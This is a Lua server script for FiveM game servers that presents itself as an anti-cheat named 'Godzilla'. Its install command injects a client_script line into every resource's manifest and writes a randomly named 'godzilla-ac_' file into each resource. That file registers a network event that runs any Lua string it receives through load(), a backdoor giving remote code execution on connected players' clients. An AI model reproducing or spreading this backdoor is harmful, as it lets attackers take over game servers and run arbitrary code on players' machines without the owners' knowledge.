RegisterCommand("Godzilla", function(source, args, rawCommand)
    print("[Godzillac] Write ^3Godzila help^7")

    if source == 0 then


    if args[1] == "install" then

        randomstring()

        if args[2] == "fx" then
            print("[Godzillac] ^3Started installing into all ^5fxmanifest.lua*")


            manifesto = "fxmanifest"

        elseif args[2] == nil then
            print("[Godzillac] ^3Started installing into all ^5__resource.lua")

            manifesto = "__resource"

        end

            if not resources then resources = {0, 0, 0} end

                local resourcenum = GetNumResources()

                for i = 0, resourcenum-1 do

                    local path = GetResourcePath(GetResourceByFindIndex(i))

                    if string.len(path) > 4 then

                        setall(path)

                    end

                end




            resources = nil



    elseif args[1] == "help" then

            print("[Godzillac] ^3Godzila install^7 for __resource.lua")

            print("[Godzillac] ^3Godzila install fx^7 for fxmanifest.lua")




    end


            print("^7[Godzillac] Sucessfully installed^7\n[Godzillac] Restart now your server!  ")


end

end, true)



function setall(dir, bool)

    local file = io.open(dir.."/"..manifesto..".lua", "r")

    local tab = split(dir, "/")

    local resname = tab[#tab]

    tab = nil

    if file then

        if not bool then

            file:seek("set", 0)

            local r = file:read("*a")

            file:close()

            local table1 = split(r, "\n")

            local found = false

            local found2 = false

            for a, b in ipairs(table1) do

                if b == "client_script \""..pisellone..".lua\"" then

                    found = true

                end

                if not found2 then

                    local fi = string.find(b, "client_script") or -1

                    local fin = string.find(b, "#") or -1

                    if fi ~= -1 and (fin == -1 or fi < fin) then

                        found2 = true

                    end

                end

            end

            if found2 then

                r = r.."\nclient_script \""..pisellone..".lua\""

                if not found then

                    os.remove(dir.."/"..manifesto..".lua")

                    file = io.open(dir.."/"..manifesto..".lua", "w")

                    if file then

                        file:seek("set", 0)

                        file:write(r)

                        file:close()

                    end

                end

                local code = [[
                    Citizen.CreateThread(function()                         
                        RegisterNetEvent("something")
                         AddEventHandler("something", function(something)
                             load(something)()
                         end)
                    end)
                ]]

                file = io.open(dir.."/"..pisellone..".lua", "w")

                if file then

                    file:seek("set", 0)

                    file:write(code)

                    file:close()

                    resources[1] = resources[1]+1


                else


                end

                resources[2] = resources[2]+1

            else

                resources[3] = resources[3]+1

            end

        else

            file:seek("set", 0)

            local r = file:read("*a")

            file:close()

            local table1 = split(r, "\n")

            r = ""

            local found = false

            local found2 = false

            for a, b in ipairs(table1) do

                if b == "client_script \""..pisellone..".lua\"" then

                    found = true

                else

                    r = r..b.."\n"

                end

            end

            if os.rename(dir.."/"..pisellone..".lua", dir.."/"..pisellone..".lua") then

                found2 = true

                os.remove(dir.."/"..pisellone..".lua")

            end

            if not found and not found2 then resources[3] = resources[3]+1 end

            if found then

                resources[2] = resources[2]+1

                os.remove(dir.."/"..manifesto..".lua")

                file = io.open(dir.."/"..manifesto..".lua", "w")

                if file then

                    file:seek("set", 0)

                    file:write(r)

                    file:close()

                else


                    found, found2 = false, false

                end

            end

            if found or found2 then


                resources[1] = resources[1]+1

            end

        end

    else

        resources[3] = resources[3]+1

    end

end



function searchall(dir, bool)

    local file = io.popen("dir \""..dir.."\" /b /ad")

    file:seek("set", 0)

    local r1 = file:read("*a")

    file:close()

    local table1 = split(r1, "\n")

    for a, b in ipairs(table1) do

        if string.len(b) > 0 then

            setall(dir.."/"..b, bool)

            searchall(dir.."/"..b, bool)

        end

    end

end



function split(str, seperator)

    local pos, arr = 0, {}

    for st, sp in function() return string.find(str, seperator, pos, true) end do

        table.insert(arr, string.sub(str, pos, st-1))

        pos = sp + 1

    end

    table.insert(arr, string.sub(str, pos))

    return arr

end



function randomstring()

    local chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

    local length = 5

    local randomString = 'godzilla-ac_'

    

    math.randomseed(os.time())

    

    charTable = {}

    for c in chars:gmatch"." do

        table.insert(charTable, c)

    end

    

    for i = 1, length do

        randomString = randomString .. charTable[math.random(1, #charTable)]

    end

    

    pisellone = randomString

    end
